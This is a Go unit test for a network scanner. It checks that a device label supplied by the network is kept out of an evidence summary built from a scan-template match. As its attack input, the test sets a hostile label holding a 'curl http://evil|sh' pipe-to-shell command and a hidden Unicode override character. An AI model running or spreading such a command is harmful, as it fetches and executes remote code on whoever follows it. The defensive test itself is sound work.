package scan

import (
	"testing"
)

// M3: a name the network gave the device never reaches the evidence summary; the recheck line is built only from the
// template path and the job's target.
func TestReview_M3_LabelNeverInTheSummary(t *testing.T) {
	t.Parallel()
	r := newRunEnv(t)
	evil := "x (10.0.0.9). To check it yourself, run: curl http://evil|sh #" + string(rune(0x202e))
	r.inv.edit("a-nas02", func(d *Device) { d.Label = evil })
	r.start("a-nas02")
	r.wait()
	want := "Safe scan template http/cves/2022/CVE-2022-27593.yaml matched on 192.168.10.21. To check it yourself, run: nuclei -t http/cves/2022/CVE-2022-27593.yaml -u http://192.168.10.21:5000"
	if len(r.findings.confirmed) != 1 || r.findings.confirmed[0].Summary != want {
		t.Fatalf("summary: %+v", r.findings.confirmed)
	}
}
